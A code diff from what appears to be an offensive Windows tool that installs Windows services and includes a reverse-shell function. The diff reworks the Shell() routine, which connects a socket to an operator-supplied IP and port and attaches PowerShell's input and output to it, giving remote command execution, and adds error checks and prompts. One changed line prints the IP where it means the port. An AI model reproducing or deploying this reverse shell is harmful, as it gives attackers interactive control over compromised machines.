@@ -37,10 +37,10 @@ VOID InstallSvc(SC_HANDLE SCManager)
         REEF(binaryPath);
         exit(PrintError());
     }
-    printf("Service %s installed.\n", SVC_NAME);
     CloseServiceHandle(SCManager);
     CloseServiceHandle(handlerSvc);
     REEF(binaryPath);
+    printf("Service %s installed.\n", SVC_NAME);
 }
 
 /**
@@ -194,30 +194,42 @@ VOID ShowSvc(SC_HANDLE SCManager)
     CloseServiceHandle(handlerSvc);
 }
 
-//revserse shell
+//reverse shell
 VOID Shell(void)
 {
     WSADATA wsaData;
     SOCKET Winsock;
     struct sockaddr_in srv; 
-    struct hostent *host; 
-    char ip_addr[16] = "127.0.0.1"; 
-    char port[6] = "4242";
-    char cmd[255] = "powershell.exe";
+    char ip_addr[17]; 
+    char port[7];
     STARTUPINFO init_proc;
     PROCESS_INFORMATION processo_info;
 
+    printf("Give the IPv4 address to connect to :\n");
+    scanf_s("%16s", &ip_addr, (unsigned)_countof(ip_addr));
+    printf("Choosen address : %s\n", ip_addr);
+    printf("Give the port to connect to :\n");
+    scanf_s("%6s", &port, (unsigned)_countof(port));
+    printf("Choosen port : %s\n", ip_addr);
     WSAStartup(MAKEWORD(2, 2), &wsaData);
-    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
-    host = gethostbyname(ip_addr);
-    strcpy_s(ip_addr, 16, inet_ntoa(*((struct in_addr *)host->h_addr)));
+    Winsock = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
     srv.sin_family = AF_INET;
     srv.sin_port = htons((u_short)atoi(port));
-    srv.sin_addr.s_addr = inet_addr(ip_addr);
-    WSAConnect(Winsock, (SOCKADDR*)&srv, sizeof(srv), NULL, NULL, NULL, NULL);
+    if (inet_pton(AF_INET, ip_addr, &srv.sin_addr.s_addr) != 1)
+    {
+        int res = WSAGetLastError();
+        printf("inet_pton failed. Error code : %d\n", res);
+        exit(1);
+    }
+    if (WSAConnect(Winsock, (SOCKADDR*)&srv, sizeof(srv), NULL, NULL, NULL, NULL) != 0)
+    {
+        int res = WSAGetLastError();
+        printf("WSAConnect failed. Error code : %d\n", res);
+        exit(1);
+    }
     memset(&init_proc, 0, sizeof(init_proc));
     init_proc.cb = sizeof(init_proc);
     init_proc.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
     init_proc.hStdInput = init_proc.hStdOutput = init_proc.hStdError = (HANDLE)Winsock;
-    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &init_proc, &processo_info);
+    CreateProcess(NULL, POWERSHELL_NAME, NULL, NULL, TRUE, 0, NULL, NULL, &init_proc, &processo_info);
 }
